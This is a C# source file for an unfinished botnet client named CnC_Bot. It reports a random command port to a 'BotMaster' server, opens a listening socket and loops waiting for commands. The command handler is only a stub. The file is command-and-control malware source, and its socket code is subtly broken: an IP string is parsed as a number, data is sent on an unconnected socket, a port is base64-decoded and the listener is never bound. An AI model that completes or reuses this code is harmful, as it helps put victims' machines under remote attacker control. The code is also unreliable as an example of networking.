using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace CnC_Bot
{
    public class Bot
    {
        private int RandomCommandPort;
        private Socket CommandsSocket;

        /// <summary>
        /// Make initial contact with the server notifying him there is a new active bot.
        /// In addition, send the server the random generated port in which he should pass commands on.
        /// </summary>
        /// <param name="serverIP">The server ip</param>
        /// <param name="serverPort">The server port</param>
        /// <returns>True on success ; False on failure</returns>
        private bool Connect(string serverIP, int serverPort)
        {
            try
            {
                IPEndPoint localEndPoint = new IPEndPoint(Convert.ToInt64(serverIP), serverPort);
                Socket connectMessage = new Socket(localEndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                
                Random rand = new Random();
                RandomCommandPort = rand.Next(3000, 8000);

                connectMessage.Send(Convert.FromBase64String(String.Format("{0}", RandomCommandPort)));
                connectMessage.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to connect to BotMaster!{0}",ex.ToString());
                return false;
            }

            return true;
        }

        /// <summary>
        /// The method that initiate all.
        /// 1. Make first contact with server and send the listening port.
        /// 2. Wait for commands to come and execute them.
        /// </summary>
        /// <param name="serverIP">The server ip</param>
        /// <param name="serverPort">The server port</param>
        public void Start(string serverIP, int serverPort)
        {
            if (Connect(serverIP, serverPort))
            {
                Listen();
                while (true)
                {
                    Recv_Command();
                }
            }
        }

        /// <summary>
        /// Open socket for incoming commands from server.
        /// </summary>
        private void Listen()
        {
            try
            {
                // Establish the local endpoint for the socket.
                // Dns.GetHostName returns the name of the host running the application.
                IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
                IPAddress ipAddr = ipHost.AddressList[0];
                IPEndPoint localEndPoint = new IPEndPoint(ipAddr, RandomCommandPort);

                // Creation TCP/IP Socket using socket Class Costructor
                this.CommandsSocket = new Socket(ipAddr.AddressFamily,
                             SocketType.Stream, ProtocolType.Tcp);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to create listening socket on port {0}\n{1}", RandomCommandPort, ex.ToString());
            }
        }

        private void Recv_Command()
        {
            throw new NotImplementedException();
        }
    }
}
